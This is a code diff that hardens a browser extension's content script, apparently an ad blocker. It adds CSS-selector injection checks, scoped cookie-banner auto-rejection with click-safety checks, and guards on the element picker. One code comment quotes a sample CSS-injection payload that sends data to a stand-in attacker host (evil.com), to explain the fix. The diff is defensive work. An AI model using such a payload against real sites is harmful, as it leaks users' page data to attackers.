@@ -140,8 +140,37 @@
       allSel = [...new Set([...allSel, ...NON_YOUTUBE_ONLY])];
     }
 
-    // Build CSS
-    let css = allSel.map(s =>
+    // CI-01 FIX (v1.2) — validate selectors BEFORE building CSS, and
+    // reject any selector that could break out of a CSS rule.
+    //
+    // querySelector() accepts a selector like
+    //   a[title="}*{background:url(//evil.com/leak)"]
+    // because braces are legal INSIDE a quoted attribute value. But once
+    // we concatenate it into `${selector}{display:none}` and drop it into
+    // a <style>, the CSS parser reads the }*{ as structural and the
+    // attacker has injected an arbitrary rule into every page — a CSS
+    // exfiltration vector (leaking attribute values / element presence via
+    // background-image requests to an attacker server).
+    //
+    // Defense in depth:
+    //   1. reject selectors containing raw  {  }  @  ;  or a closing
+    //      </style sequence — none are valid in a real element selector
+    //   2. still require querySelector() to accept it (catches other
+    //      syntax errors so one bad rule doesn't break the rest)
+    const CSS_BREAKOUT = /[{}@;]|<\/?style/i;
+    const validSelectors = [];
+    for (const s of allSel) {
+      if (typeof s !== 'string' || !s.trim()) continue;
+      if (s.length > 500) continue;                 // absurdly long = suspicious
+      if (CSS_BREAKOUT.test(s)) continue;           // CSS-injection guard
+      try {
+        document.querySelector(s);                  // throws on syntax error
+        validSelectors.push(s);
+      } catch (_) { /* malformed selector — skip */ }
+    }
+
+    // Build CSS from the VALIDATED list only.
+    let css = validSelectors.map(s =>
       `${s}{display:none!important;visibility:hidden!important;height:0!important;overflow:hidden!important}`
     ).join('\n');
 
@@ -189,19 +218,7 @@ ytd-video-masthead-ad-v3-renderer{display:none!important}
       (document.head || document.documentElement)?.appendChild(style);
     } catch (e) {}
 
-    // L-04 FIX — validate each selector individually before joining. A
-    // single malformed selector from a remote filter list will throw on
-    // querySelectorAll() and zero out the badge count. Filtering first
-    // ensures one bad rule doesn't kill counting for the whole page.
-    const validSelectors = [];
-    for (const s of allSel) {
-      try {
-        // querySelector throws synchronously on syntax errors. We discard
-        // the result; we only care whether the selector parses.
-        document.querySelector(s);
-        validSelectors.push(s);
-      } catch (_) { /* malformed selector — skip */ }
-    }
+    // countSelector reuses the validated, breakout-safe list from above.
     const countSelector = validSelectors.join(',');
 
     function countOnce() {
@@ -284,27 +301,92 @@ ytd-video-masthead-ad-v3-renderer{display:none!important}
   // COOKIE AUTO-REJECT
   // ═══════════════════════════════════
   if (F.cookie) {
+    // Curated list of known CMP/cookie-banner button selectors.
+    // These are SPECIFIC IDs/classes — clicking them is safe because they
+    // belong to known consent management platforms (OneTrust, Cookiebot,
+    // Didomi, Quantcast, etc) which Zenith has audited.
     const BTNS = [
       '#onetrust-reject-all-handler','#CybotCookiebotDialogBodyButtonDecline',
       '#didomi-notice-disagree-button','.qc-cmp2-summary-buttons button[mode="secondary"]',
-      'button[aria-label*="reject"]','button[aria-label*="deny"]','button[aria-label*="decline"]',
     ];
+    // Containers that hold cookie banners. Text-based button matching is
+    // SCOPED to descendants of these containers ONLY — never the whole page.
     const BANNERS = [
       '#onetrust-banner-sdk','#CybotCookiebotDialog','.truste_overlay','.qc-cmp2-container',
       '#didomi-host','[class*="cookie-banner"]','[class*="cookie-consent"]',
       '[class*="cookie-notice"]','[id*="cookie-consent"]','[class*="gdpr"]',
       '[class*="consent-banner"]','[class*="cc-window"]','.fc-consent-root',
+      // aria-based scopes (only the container, then we search inside)
+      '[role="dialog"][aria-label*="cookie" i]','[role="dialog"][aria-label*="consent" i]',
     ];
     const RE = [/^reject\s*(all)?$/i,/^deny\s*(all)?$/i,/^decline\s*(all)?$/i,/^no,?\s*thanks?$/i,/^only\s*(essential|necessary)/i];
 
-    function reject() {
-      for (const s of BTNS) { try { const b = document.querySelector(s); if (b && b.offsetParent !== null) { b.click(); return; } } catch(e){} }
-      for (const b of document.querySelectorAll('button, a[role="button"]')) {
-        const t = (b.textContent||'').trim(); if (t.length > 50) continue;
-        if (RE.some(r => r.test(t)) && b.offsetParent !== null) { b.click(); return; }
+    // H-A FIX — a button is only safe to auto-click if it has no inline
+    // event handlers (which a malicious page could use to exfiltrate data
+    // when Zenith clicks it). Also reject anchors pointing off-domain.
+    function isSafeToClick(b) {
+      if (!b || b.offsetParent === null) return false;
+      // No inline event handlers
+      const evtAttrs = ['onclick','onmousedown','onmouseup','onpointerdown','onpointerup','onauxclick'];
+      for (const a of evtAttrs) if (b.hasAttribute(a)) return false;
+      // No external-origin href on anchors
+      if (b.tagName === 'A' && b.href) {
+        try {
+          const u = new URL(b.href, location.href);
+          if (u.origin !== location.origin && !u.href.startsWith('javascript:void')) return false;
+          if (u.href.startsWith('javascript:') && !u.href.startsWith('javascript:void')) return false;
+        } catch (e) { return false; }
       }
-      for (const s of BANNERS) { try { const e = document.querySelector(s); if (e) e.style.setProperty('display','none','important'); } catch(e){} }
-      try { document.body.style.overflow=''; document.documentElement.style.overflow=''; } catch(e){}
+      return true;
+    }
+
+    function reject() {
+      // Step 1: try the curated SAFE selectors first. These are specific
+      // to known CMPs so we trust them.
+      for (const s of BTNS) {
+        try {
+          const b = document.querySelector(s);
+          if (b && b.offsetParent !== null) { b.click(); return; }
+        } catch (e) {}
+      }
+
+      // Step 2: text-based matching, but SCOPED to descendants of known
+      // CMP banner containers ONLY. We never scan the whole page for
+      // "reject"-like text — a malicious page could host a hidden button
+      // with that text and an onclick handler to exfiltrate data.
+      const bannerEls = [];
+      for (const s of BANNERS) {
+        try {
+          const found = document.querySelectorAll(s);
+          for (const e of found) bannerEls.push(e);
+        } catch (e) {}
+      }
+      for (const banner of bannerEls) {
+        const candidates = banner.querySelectorAll('button, a[role="button"], [role="button"]');
+        for (const b of candidates) {
+          const t = (b.textContent || '').trim();
+          if (t.length === 0 || t.length > 50) continue;
+          if (RE.some(r => r.test(t)) && isSafeToClick(b)) {
+            b.click();
+            return;
+          }
+        }
+        // Also try aria-label inside the banner
+        const ariaBtns = banner.querySelectorAll('button[aria-label*="reject" i], button[aria-label*="deny" i], button[aria-label*="decline" i]');
+        for (const b of ariaBtns) {
+          if (isSafeToClick(b)) { b.click(); return; }
+        }
+      }
+
+      // Step 3: as a fallback, hide any banner containers that are still
+      // visible. Hiding is safe (no code execution) so this is broader.
+      for (const s of BANNERS) {
+        try {
+          const e = document.querySelector(s);
+          if (e) e.style.setProperty('display','none','important');
+        } catch (e) {}
+      }
+      try { document.body.style.overflow=''; document.documentElement.style.overflow=''; } catch (e) {}
     }
     const go = () => { setTimeout(reject, 800); setTimeout(reject, 3000); };
     if (document.readyState === 'complete') go(); else window.addEventListener('load', go);
@@ -368,25 +450,57 @@ ytd-video-masthead-ad-v3-renderer{display:none!important}
   // ELEMENT PICKER
   // ═══════════════════════════════════
   try {
+    // L-C — refuse to hide structural elements; doing so blanks the page
+    // with no undo.
+    const STRUCTURAL = new Set(['HTML','HEAD','BODY','MAIN']);
+    function isStructural(el) {
+      if (!el || !el.tagName) return true;
+      if (STRUCTURAL.has(el.tagName)) return true;
+      // Also refuse anything that contains the document body
+      try { if (el.contains(document.body)) return true; } catch (e) {}
+      return false;
+    }
+
     chrome.runtime.onMessage.addListener((msg) => {
       if (msg.type === 'PICK_ELEMENT') {
         document.body.style.cursor = 'crosshair';
         let last = null;
-        const hover = (e) => { if (last) last.style.outline=''; e.target.style.outline='3px solid #e74c3c'; last=e.target; };
+        const hover = (e) => {
+          if (last) last.style.outline = '';
+          if (isStructural(e.target)) { last = null; return; } // don't highlight unhideable elements
+          e.target.style.outline = '3px solid #e74c3c';
+          last = e.target;
+        };
         const pick = (e) => {
           e.preventDefault(); e.stopPropagation();
-          e.target.style.outline=''; e.target.style.setProperty('display','none','important');
-          document.body.style.cursor='default';
-          document.removeEventListener('click',pick,true); document.removeEventListener('mouseover',hover,true);
-          send({ type:'REPORT_BLOCKED', count:1 });
+          const target = e.target;
+          if (isStructural(target)) {
+            // Quietly refuse — restore cursor and clean up
+            document.body.style.cursor = 'default';
+            document.removeEventListener('click', pick, true);
+            document.removeEventListener('mouseover', hover, true);
+            return;
+          }
+          target.style.outline = '';
+          target.style.setProperty('display', 'none', 'important');
+          document.body.style.cursor = 'default';
+          document.removeEventListener('click', pick, true);
+          document.removeEventListener('mouseover', hover, true);
+          send({ type: 'REPORT_BLOCKED', count: 1 });
         };
-        document.addEventListener('mouseover',hover,true);
-        document.addEventListener('click',pick,true);
+        document.addEventListener('mouseover', hover, true);
+        document.addEventListener('click', pick, true);
         document.addEventListener('keydown', function esc(e) {
-          if (e.key==='Escape') { if(last)last.style.outline=''; document.body.style.cursor='default'; document.removeEventListener('click',pick,true); document.removeEventListener('mouseover',hover,true); document.removeEventListener('keydown',esc,true); }
+          if (e.key === 'Escape') {
+            if (last) last.style.outline = '';
+            document.body.style.cursor = 'default';
+            document.removeEventListener('click', pick, true);
+            document.removeEventListener('mouseover', hover, true);
+            document.removeEventListener('keydown', esc, true);
+          }
         }, true);
       }
     });
-  } catch(e){}
+  } catch (e) {}
 
 })();
